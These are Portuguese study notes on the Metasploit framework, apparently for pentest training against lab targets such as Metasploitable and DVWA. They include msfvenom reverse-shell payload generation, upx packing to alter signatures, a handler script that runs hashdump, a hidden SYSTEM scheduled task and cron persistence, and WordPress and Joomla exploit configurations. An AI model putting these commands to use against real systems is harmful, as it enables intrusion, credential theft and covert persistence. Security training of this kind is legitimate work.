
#### Geral

- Mantida Rapid7
- Linha de comando ionterativa: msfconsole

#### Principais compronentes

- msfconsole
- msfvenom
- meterpreter
- db_nmap
- auxiliary modeles
- exploit modules
- payloads
- post modules

#### Exploit & Payload

- Exploit é o mecanismo que aproveita uma falha no alvo para obter acesso. Ele prepara o terreno para a execução de código malicioso.   
	- Rack
		- Excellent
		- Great
		- Good
		- Normal
		- Average
		- Low
		- Manual
	- multi/handler
- Payload é o código executado após o sucesso do exploit. Ele define o que será feito no sistema comprometido: abrir um shell reverso, instalar um backdoor, capturar dados, entre outros.
	- bind --> alvo abre uma porta e aguarda uma conexão (alvo servidor & atacante cliente)
		- Ex: set PAYLOAD linux/x86/sell_bind_tcp
	- reverse --> O alvo é quem inicia a conexão de volta para o atacante ()
		- Ex: set PAYLOAD linux/x86/sell_reserse_tcp
	- Executar 
		- exploit ou run
	- Interagir com a sessão 
		- sessions -i \<numero da sessão>

#### Atualização 

- sudo msfupdate

#### postgresql

- Status
	- sudo systemctl status postgresql
- Ativar
	- sudo systemctl start postgresql
- iniciar o banco (msfconsole)
	- msfdb init
- Verificar os enumerados coletado(IP, porta e etc)
	- services [-p [porta]]

#### msfconsole

- help: exibe todos os comandos disponíveis no contexto atual, com breve descrição de uso.
- banner: muda a arte do terminal. É puramente estético. 
- clear: limpa a tela.
- version: mostra a versão atual do Metasploit instalada. 
- exit ou quit: encerra o console com segurança.

**Comandos principais**

- search
	- localizar módulos a partir de palavras-chaves
	- sistema operacional
	- protocolo
	- versão 
	- CVE
	- Ex: search type:exploit name:samba
		- search apache
		- search samba
		- search openssl
	- Filtro: 
		- type
		- platform
		- author
		- vce
		- ref
		- name
- use
	- carrega o módulo para o terminal
	- Ex: use exploit/linux/samba/usermap_script
- info
	- Mosta todas as informaçoes sobre o módulo
	- Ex: info exploit/windows/smb/ms17_010_eternalblue
- set
	- Definir variáveis
- exploit(run)
	- Executa o ataque utilizando nas configuraçoes definidas

#### MSFVENOM

- Criação, personalização e exportação de payloads
- msfvenom -p \<payload> LHOST=\<ip> LPORT=\<porta> -f  \<formato> -o \<arquivo>
	- -p define o payload a ser utilizado, como windows/meterpreter/reverse_tcp. 
	- LHOST e LPORT são os parâmetros de rede onde o operador aguarda a conexão reversa. 
	- -f indica o formato do output, como exe, elf, python, c, asp, war, psh, raw, entre outros. 
	- -o salva o resultado em um arquivo específico.
- Listar todos os payloads
	- msfvenom -l payloads
- Verificar os parâmetros obrigatórios de cada payload
	- msfvenom -p \<payload> --list-options
- Verificar os encoders
	- msfvenom  --list encoders
	- -e --> define o encoder
- Compactar e modificar a assinatura do executável 
	- upx --best \<arquivo.exe>
	- upx --best --lzma\<arquivo.exe>


#### Módulo

- /opt/metasploit-framework/modules/
- script .rb(Ruby)

- Exploit: módulos responsáveis por explorar uma vulnerabilidade específica em um software, sistema ou serviço. Exigem configuração de variáveis como RHOSTS, RPORT e payload.
	- show exploit
	- info
- Payload: códigos executados após a exploração. Estão agrupados por sistema operacional e arquitetura. Exemplos incluem shells reversos, bindshells, downloads, scripts de sistema, entre outros.
	- show payloads
- Auxiliary: ferramentas auxiliares que não executam ataques diretos. Incluem scanners, brute force, fuzzing, coletor de banners, e verificadores de vulnerabilidade. Não exigem payload.
	- shwo auxiliary
- Post: utilizados após a obtenção de acesso ao sistema remoto. Incluem elevação de privilégio, coleta de senhas, busca de arquivos, movimentação lateral, entre outras ações típicas de pós-exploração.
	- show post
- Encoder: módulos usados para codificar payloads com o objetivo de dificultar a detecção por antivírus ou firewalls. 
- Nop: geradores de instruções inócuas que servem para ajustar tamanhos de payloads em certos tipos de ataque.

#### NMAP

- db_nmap <opçoes>
- db_import /caminho/para/scan_nmap.xml

#### Paramentos 

LHOST --> Local Host
LPORT --> Local Port

#### Pós-exploração

- Verificar as sessão ativas
	- sessions
- Interagir com a sessão 
	- sessions -i \<numero da sessão>
- Credenciais, hashes de senha, tokens 
	- hashdump
- Verificar usuario do sistema 
	- getuid
- Listar os processos em execução 
	- ps

#### Script & Automação 

- script com a extensão **.rc**
- comentario dentro do script **#**
- Executando o script 
	- msfconsole -r \<script.rc>
- Sequência Lógica de ações
	- Configuração inicial
		- Definição do exploit, payload e parâmetros 
		- Leitura de variáveis ou arquivos externos (se aplicável)
	- Execução da exploração 
		- Uso do comando exploit, com ou sem a flag -j para execução em background
	- Gerenciamento de sessão
		- Interação com a sessão aberta ou execução de módulos pós-exploração
	- Registro e limpeza
		- Geração de logs, exportação de dados, encerramento controlado 
	- Exemplo: 
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444 
exploit -j
sleep 10
sessions -i 1
run post/windows/gather/hashdump
```

#### Sandbox
- Cuckoo
- FireEye

#### Persistência e acesso contínuo

- Windows 
	- %APPDATA%\Microsoft\Windows\Start 
	- Menu\Programs\Startup
	- .bat, .exe ou .lnk
	- Agendador de tarefa: Task Schedule
		- PowerShell
		- 
```
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1" $trigger = New-ScheduledTaskTrigger -AtLogOn Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AtualizadorWin" -Description "Sincronização" -User "SYSTEM"
```

- Linux
	- Arquivo
		- .bashrc, .profile, /etc/rc.local
	- Diretório
		- /etc/init.d/
	- Agendador de tarefa:  crontab
		- Inserção de linha: @reboot /usr/bin/python3 /home/user/.config/backup.py

#### Técnicas de fuzzing e exploração cega

- auxiliary/fuzzer
- Exemplo serviço HTTP

```
use auxiliary/fuzzer/http/http_fuzzer
set RHOSTS 192.168.56.101
set RPORT 80 
set FUZZER_FILE /usr/share/metasploit-framework/data/wordlists/fuzzing/http_fuzzing_list.txt
set THREADS 5
run
```

#### Lab

- Metasploitable 2 (Linux)
- DVWA(Damn Vulnerable Web Applicarion) (Web)
	- Instalação 
```
sudo apt update && sudo apt install apache2 php mysql-server php-mysqli git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
```
- VulnHub(VMs)
- OWASP Broken Web Applications(Web)
- Windown XP SP2 ou SP3(não ativado)

#### Teste de rede interna

**ARP**

```
auxiliary/scanner/discovery/arp_sweep
set RHOST <rede>
set INTERFACE <interface>
run
```

**DHCP**

```
auxiliary/scanner/dhcp/dhcp_discover
set INTERFACE <interface>
run
```

**TCP**

```
auxiliary/scanne/portscan/tcp
set RHOST <rede>
set PORTS 1-1000
set THREADS 50
run
```

- Coleta informaçoes de versão de servidores Windows 
	- auxiliary/scanne/smb/smb_version
- Descobre versão de servidores SSH
	- auxiliary/scanne/ssh/ssh_version
- Coleta banner de servidores WEB interno
	- auxiliary/scanne/http/http_version
- Sniffing
	- auxiliary/sniffer/psnuffle

**Pivoting e Port Forwarding**
- Portfwd: redireciona portas locais da maquina atacada para outros sistemas
- Routing: permite adicionar rotas e usar o meterpreter como pivô
	- run post/multi/manage/autoroute

#### Teste em webapps


```
auxiliary/scanne/http/title
set RHOST <rede>
set THREADS 10
run
```

- Descobrir diretórios e arquivos ocultos
	- auxiliary/scanne/http/dir_scanner

**WordPress**

```
use exploit/unix/webapp/wp_content_injection 
set RHOSTS 192.168.56.120 
set TARGETURI /wordpress/ 
set USERNAME admin 
set PASSWORD senha123 
set PAYLOAD php/meterpreter/reverse_tcp 
set LHOST 192.168.56.101 
set LPORT 4444
run
```

**SQL injection**

```
use exploit/multi/http/joomla_com_content_history_sqli 
set RHOSTS 192.168.56.130 
set TARGETURI /joomla/
set PAYLOAD php/meterpreter/reverse_tcp 
set LHOST 192.168.56.101 
set LPORT 5555 
run
```

#### Relatórios

**Sumário executivo** 
- Apresenta de forma objetiva o escopo, a metodologia, o resumo dos achados e as recomendações principais. Este é o único trecho lido por muitos decisores não técnicos.
**Metodologia aplicada**
- Explica a abordagem utilizada, com referências a frameworks como PTES, OWASP, MITRE ATT&CK, ou metodologias próprias da equipe. Deve incluir as ferramentas utilizadas e o escopo do ambiente avaliado.
**Reconhecimento**
- Descreve a coleta passiva e ativa de informações: mapeamento de rede, identificação de alvos, descoberta de portas e serviços.
**Enumeração**
- Apresenta os dados coletados sobre os serviços, sistemas, versões, banners, diretórios ocultos e endpoints sensíveis.
**Exploração** 
- Mostra as tentativas e os sucessos na exploração de vulnerabilidades. Cada exploração deve conter:
	- Descrição técnica da vulnerabilidade        
	- Evidência da exploração        
	- Impacto potencial 
	- Recomendação
**Pós-exploração**
- Relata ações realizadas após o comprometimento: extração de dados, movimentação lateral, elevação de privilégios e persistência. 
**Conclusão e recomendações** 
- Resume os pontos críticos encontrados, classifica-os por criticidade (baixa, média, alta, crítica) e oferece sugestões práticas de mitigação.
**Apêndices técnicos**
- Inclui scripts utilizados, hashes obtidos, logs brutos e qualquer outro dado relevante que não deva poluir o corpo principal do relatório.